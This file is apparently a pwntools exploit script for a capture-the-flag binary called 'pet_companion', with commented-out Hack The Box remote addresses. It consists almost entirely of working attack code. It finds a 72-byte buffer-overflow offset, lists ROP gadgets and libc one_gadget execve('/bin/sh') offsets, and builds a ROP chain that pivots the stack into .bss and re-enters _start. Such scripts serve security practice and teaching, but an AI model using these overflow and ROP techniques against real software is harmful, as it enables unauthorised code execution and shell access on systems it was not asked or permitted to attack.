'''
cyclic 1024
cyclic -l raaa
68+4 == 72

0x00000000004004de : ret
'''

#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

offset = 72

binary = ELF('./pet_companion')
libc = ELF('./glibc/libc.so.6')

padding = offset*b'A'

#ip, port='161.35.168.118', 30070
#ip, port = '83.136.250.41', 46944   #HTB
#io = remote(ip,port)
#io = process('./pet_companion')
io = gdb.debug('./pet_companion','break main')

#0x0000000000401108 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
#0x00000000004005e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret

#ropr void -m 10 #default ropr/ROP_gadget is not enought!!
#0x004011b2: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
#0x0040073a: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;


'''
one_gadget challenge/glibc/libc.so.6
0xc961a execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xc961d execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xc9620 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''

#one_gadget = 0x4f2a5
#one_gadget = 0x4f302
#one_gadget = 0x10a2fc

new_stack = (binary.bss() & 0xfff000) + 0xf00
pop_rdi = binary.search(asm('pop rdi; ret')).__next__()
pop_rsi_r15 = binary.search(asm('pop rsi ; pop r15 ; ret')).__next__()
pop_rsp_r13_r14_r15 = binary.search(asm('pop rsp; pop r13; pop r14; pop r15; ret')).__next__()

payload  = b''
payload += offset * b'A'
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(new_stack)
payload += p64(0)
payload += p64(binary.plt.read)
payload += p64(pop_rsp_r13_r14_r15)
payload += p64(new_stack)

io.recvuntil('current status:')
io.sendline(payload)

payload  = b''
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(binary.sym._start)

io.recvuntil('current status:')
io.sendline(payload)

